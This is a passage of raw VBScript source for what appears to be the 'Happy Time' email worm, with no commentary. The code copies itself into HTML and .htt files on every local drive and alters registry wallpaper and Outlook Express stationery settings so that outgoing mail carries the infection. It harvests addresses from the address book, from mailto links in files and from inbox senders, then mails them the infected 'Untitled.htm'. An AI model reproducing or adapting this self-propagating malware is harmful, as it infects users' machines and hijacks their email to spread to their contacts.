If (CInt(Cn) Mod 366) = 0 Then  
If (CInt(Second(Time)) Mod 2) = 0 Then  
Tsend  
Else  
adds = Og  
Msend (adds)  
End If  
End If  
wp = Rg("HKEY_CURRENT_USER\Control Panel\desktop\wallPaper")  
If Rg(Ks & "Help\wallPaper") <> wp Or wp = "" Then  
If wp = "" Then  
n1 = ""  
n3 = Cs & "\Help.htm"  
Else  
mP = Of.GetFile(wp).ParentFolder  
n1 = Of.GetFileName(wp)  
n2 = Of.GetBaseName(wp)  
n3 = Cs & "\" & n2 & ".htm"  
End If  
Set pfc = Of.CreateTextFile(n3, True)  
mt = Sa("1100")  
pfc.Write "<" & "HTML><" & "body bgcolor='#007f7f' background='" & n1 & "'><" & "/Body><" & "/HTML>" & mt  
pfc.Close  
Rw Ks & "Help\wallPaper", n3  
Rw "HKEY_CURRENT_USER\Control Panel\desktop\wallPaper", n3  
End If  
Else  
Set fc = Of.CreateTextFile(Ds & "\Help.vbs", True)  
fc.Write Sa("0100")  
fc.Close  
bf = Cs & "\Untitled.htm"  
Set fc2 = Of.CreateTextFile(bf, True)  
fc2.Write Lhtml  
fc2.Close  
oeid = Rg("HKEY_CURRENT_USER\Identities\Default User ID")  
oe = "HKEY_CURRENT_USER\Identities\" & oeid & "\Software\Microsoft\Outlook Express\5.0\Mail"  
MSH = oe & "\Message Send HTML"  
CUS = oe & "\Compose Use Stationery"  
SN = oe & "\Stationery Name"  
Rw MSH, 1  
Rw CUS, 1  
Rw SN, bf  
Web = Cs & "\WEB"  
Set gf = Of.GetFolder(Web).Files  
Od.Add "htt", "1100"  
For Each m In gf  
fext = GetExt(Of, Od, m)  
If fext <> "" Then  
Fw Of, m, fext  
End If  
Next  
End If  
End Sub  
Sub mclose()  
document.Write "<" & "title>I am sorry!</title" & ">"  
window.Close  
End Sub  
Sub Rt()  
Dim mPath  
On Error Resume Next  
mPath = Grf()  
Iv mPath, "Help.vbs"  
End Sub  
Function Sa(n)  
Dim VBSText, m  
VBSText = Lvbs()  
If Mid(n, 3, 1) = 1 Then  
m = "<%" & VBSText & "%>"  
End If  
If Mid(n, 2, 1) = 1 Then  
m = VBSText  
End If  
If Mid(n, 1, 1) = 1 Then  
m = Lscript(m)  
End If  
Sa = m & vbCrLf  
End Function  
Sub Fw(Of, S, n)  
Dim fc, fc2, m, mmail, mt  
On Error Resume Next  
Set fc = Of.OpenTextFile(S, 1)  
mt = fc.ReadAll  
fc.Close  
If Not Sc(mt) Then  
mmail = Ml(mt)  
mt = Sa(n)  
Set fc2 = Of.OpenTextFile(S, 8)  
fc2.Write mt  
fc2.Close  
Msend (mmail)  
End If  
End Sub  
Function Sc(S)  
mN = "Rem I am sorry! happy time"  
If InStr(S, mN) > 0 Then  
Sc = True  
Else  
Sc = False  
End If  
End Function  
Function FNext(Of, Od, S)  
Dim fpath, fname, fext, T, gf  
On Error Resume Next  
fname = ""  
T = False  
If Of.FileExists(S) Then  
fpath = Of.GetFile(S).ParentFolder  
fname = S  
ElseIf Of.FolderExists(S) Then  
fpath = S  
T = True  
Else  
fpath = Dnext(Of, "")  
End If  
Do While True  
Set gf = Of.GetFolder(fpath).Files  
For Each m In gf  
If T Then  
If GetExt(Of, Od, m) <> "" Then  
FNext = m  
Exit Function  
End If  
ElseIf LCase(m) = LCase(fname) Or fname = "" Then  
T = True  
End If  
Next  
fpath = Pnext(Of, fpath)  
Loop  
End Function  
Function Pnext(Of, S)  
On Error Resume Next  
Dim Ppath, Npath, gp, pn, T, m  
T = False  
If Of.FolderExists(S) Then  
Set gp = Of.GetFolder(S).SubFolders  
pn = gp.Count  
If pn = 0 Then  
Ppath = LCase(S)  
Npath = LCase(Of.GetParentFolderName(S))  
T = True  
Else  
Npath = LCase(S)  
End If  
Do While Not Er  
For Each pn In Of.GetFolder(Npath).SubFolders  
If T Then  
If Ppath = LCase(pn) Then  
T = False  
End If  
Else  
Pnext = LCase(pn)  
Exit Function  
End If  
Next  
T = True  
Ppath = LCase(Npath)  
Npath = Of.GetParentFolderName(Npath)  
If Of.GetFolder(Ppath).IsRootFolder Then  
m = Of.GetDriveName(Ppath)  
Pnext = Dnext(Of, m)  
Exit Function  
End If  
Loop  
End If  
End Function  
Function Dnext(Of, S)  
Dim dc, n, d, T, m  
On Error Resume Next  
T = False  
m = ""  
Set dc = Of.Drives  
For Each d In dc  
If d.DriveType = 2 Or d.DriveType = 3 Then  
If T Then  
Dnext = d  
Exit Function  
Else  
If LCase(S) = LCase(d) Then  
T = True  
End If  
If m = "" Then  
m = d  
End If  
End If  
End If  
Next  
Dnext = m  
End Function  
Function GetExt(Of, Od, S)  
Dim fext  
On Error Resume Next  
fext = LCase(Of.GetExtensionName(S))  
GetExt = Od.Item(fext)  
End Function  
Sub Rw(k, v)  
Dim R  
On Error Resume Next  
Set R = CreateObject("WScript.Shell")  
R.RegWrite k, v  
End Sub  
Function Rg(v)  
Dim R  
On Error Resume Next  
Set R = CreateObject("WScript.Shell")  
Rg = R.RegRead(v)  
End Function  
Function IsVbs()  
Dim ErrTest  
On Error Resume Next  
ErrTest = WScript.ScriptFullname  
If Err Then  
IsVbs = False  
Else  
IsVbs = True  
End If  
End Function  
Function IsHTML()  
Dim ErrTest  
On Error Resume Next  
ErrTest = document.Location  
If Er Then  
IsHTML = False  
Else  
IsHTML = True  
End If  
End Function  
Function IsMail(S)  
Dim m1, m2  
IsMail = False  
If InStr(S, vbCrLf) = 0 Then  
m1 = InStr(S, "@")  
m2 = InStr(S, ".")  
If m1 <> 0 And m1 < m2 Then  
IsMail = True  
End If  
End If  
End Function  
Function Lvbs()  
Dim f, m, ws, Of  
On Error Resume Next  
If IsVbs Then  
Set Of = CreateObject("Scripting.FileSystemObject")  
Set f = Of.OpenTextFile(WScript.ScriptFullname, 1)  
Lvbs = f.ReadAll  
Else  
For Each ws In document.scripts  
If LCase(ws.Language) = "vbscript" Then  
If Sc(ws.Text) Then  
Lvbs = ws.Text  
Exit Function  
End If  
End If  
Next  
End If  
End Function  
Function Iv(mPath, mName)  
Dim Shell  
On Error Resume Next  
Set Shell = CreateObject("Shell.Application")  
Shell.NameSpace(mPath).Items.Item(mName).InvokeVerb  
If Er Then  
Iv = False  
Else  
Iv = True  
End If  
End Function  
Function Grf()  
Dim Shell, mPath  
On Error Resume Next  
Set Shell = CreateObject("Shell.Application")  
mPath = "C:\"  
For Each mShell In Shell.NameSpace(mPath).Items  
If mShell.IsFolder Then  
Grf = mShell.Path  
Exit Function  
End If  
Next  
If Er Then  
Grf = ""  
End If  
End Function  
Function Gsf()  
Dim Of, m  
On Error Resume Next  
Set Of = CreateObject("Scripting.FileSystemObject")  
m = Of.GetSpecialFolder(0)  
If Er Then  
Gsf = "C:\"  
Else  
Gsf = m  
End If  
End Function  
Function Lhtml()  
Lhtml = "<" & "HTML" & "><HEAD" & ">" & vbCrLf & _  
"<" & "Title> Help </Title" & "><" & "/HEAD>" & vbCrLf & _  
"<" & "Body> " & Lscript(Lvbs()) & vbCrLf & _  
"<" & "/Body></HTML" & ">"  
End Function  
Function Lscript(S)  
Lscript = "<" & "script language='VBScript'>" & vbCrLf & _  
S & "<" & "/script" & ">"  
End Function  
Function Sl(S1, S2, n)  
Dim l1, l2, l3, i  
l1 = Len(S1)  
l2 = Len(S2)  
i = InStr(S1, S2)  
If i > 0 Then  
l3 = i + l2 - 1  
If n = 0 Then  
Sl = Left(S1, i - 1)  
ElseIf n = 1 Then  
Sl = Right(S1, l1 - l3)  
End If  
Else  
Sl = ""  
End If  
End Function  
Function Ml(S)  
Dim S1, S3, S2, T, adds, m  
S1 = S  
S3 = """"  
adds = ""  
S2 = S3 & "mailto" & ":"  
T = True  
Do While T  
S1 = Sl(S1, S2, 1)  
If S1 = "" Then  
T = False  
Else  
m = Sl(S1, S3, 0)  
If IsMail(m) Then  
adds = adds & m & vbCrLf  
End If  
End If  
Loop  
Ml = Split(adds, vbCrLf)  
End Function  
Function Og()  
Dim i, n, m(), Om, Oo  
Set Oo = CreateObject("Outlook.Application")  
Set Om = Oo.GetNamespace("MAPI").GetDefaultFolder(10).Items  
n = Om.Count  
ReDim m(n)  
For i = 1 To n  
m(i - 1) = Om.Item(i).Email1Address  
Next  
Og = m  
End Function  
Sub Tsend()  
Dim Od, MS, MM, a, m  
Set Od = CreateObject("Scripting.Dictionary")  
MConnect MS, MM  
MM.FetchSorted = True  
MM.Fetch  
For i = 0 To MM.MsgCount - 1  
MM.MsgIndex = i  
a = MM.MsgOrigAddress  
If Od.Item(a) = "" Then  
Od.Item(a) = MM.MsgSubject  
End If  
Next  
For Each m In Od.Keys  
MM.Compose  
MM.MsgSubject = "Fw: " & Od.Item(m)  
MM.RecipAddress = m  
MM.AttachmentPathName = Gsf & "\Untitled.htm"  
MM.Send  
Next  
MS.SignOff  
End Sub  
Function MConnect(MS, MM)  
Dim U  
On Error Resume Next  
Set MS = CreateObject("MSMAPI.MAPISession")  
Set MM = CreateObject("MSMAPI.MAPIMessages")  
U = Rg("HKEY_CURRENT_USER\Software\Microsoft\Windows Messaging Subsystem\Profiles\DefaultProfile")  
MS.UserName = U  
MS.DownLoadMail = False  
MS.NewSession = False  
MS.LogonUI = True  
MS.SignOn  
MM.SessionID = MS.SessionID  
End Function  
Sub Msend(Address)  
Dim MS, MM, i, a  
MConnect MS, MM  
i = 0  
MM.Compose  
For Each a In Address  
If IsMail(a) Then  
MM.RecipIndex = i  
MM.RecipAddress = a  
i = i + 1  
End If  
Next  
MM.MsgSubject = " Help "  
MM.AttachmentPathName = Gsf & "\Untitled.htm"  
MM.Send  
MS.SignOff  
End Sub  
Function Er()  
If Err.Number = 0 Then  
Er = False  
Else  
Err.Clear  
Er = True  
End If  
End Function  
Function IsDel(S)  
If Mid(S, 4, 1) = 1 Then  
IsDel = True  
Else  
IsDel = False  
End If  
End Function  
  
  
  
  
 



</script>
